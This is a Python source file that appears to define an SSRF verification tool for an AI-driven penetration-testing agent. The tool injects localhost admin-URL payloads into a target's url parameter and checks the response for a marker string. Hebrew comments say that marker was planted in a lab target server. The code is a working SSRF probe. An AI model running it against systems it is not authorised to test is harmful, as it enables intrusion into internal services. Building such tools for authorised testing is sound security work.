import requests
from pydantic import BaseModel, Field
from tools.base import BaseTool, ToolResult

class VerifySSRFInput(BaseModel):
    target_url: str = Field(description="The base endpoint to test for SSRF (e.g., 'http://192.168.42.1:5000/fetch?url=')")

class VerifySSRFTool(BaseTool):
    name = "verify_ssrf"
    description = (
        "Use this tool to definitively verify if a target URL is vulnerable to SSRF. "
        "Pass the base endpoint. The tool will inject localhost payloads and return concrete proof."
    )
    input_model = VerifySSRFInput

    def run(self, data: VerifySSRFInput) -> ToolResult:
        payloads = [
            "http://localhost:5000/admin",
            "http://127.0.0.1:5000/admin"
        ]
        
        # מסדרים את הכתובת למקרה שהמודל שלח אותה בלי סימן השווה בסוף
        base_url = data.target_url if data.target_url.endswith("=") else f"{data.target_url}?url="
        
        for payload in payloads:
            attack_url = f"{base_url}{payload}"
            try:
                response = requests.get(attack_url, timeout=5)
                # בודקים אם קיבלנו את משפט ההצלחה ששתלנו בשרת המטרה
                if response.status_code == 200 and "AutoPen SSRF Success" in response.text:
                    output_text = (
                        f"[CRITICAL VULNERABILITY CONFIRMED]\n"
                        f"Target is vulnerable to SSRF!\n"
                        f"Successful Payload: {payload}\n"
                        f"Evidence from internal server: {response.text.strip()}"
                    )
                    return ToolResult(success=True, output=output_text)
            except requests.exceptions.RequestException as e:
                continue
                
        return ToolResult(success=False, output="SSRF Verification Failed. Target does not seem vulnerable or blocked the payloads.")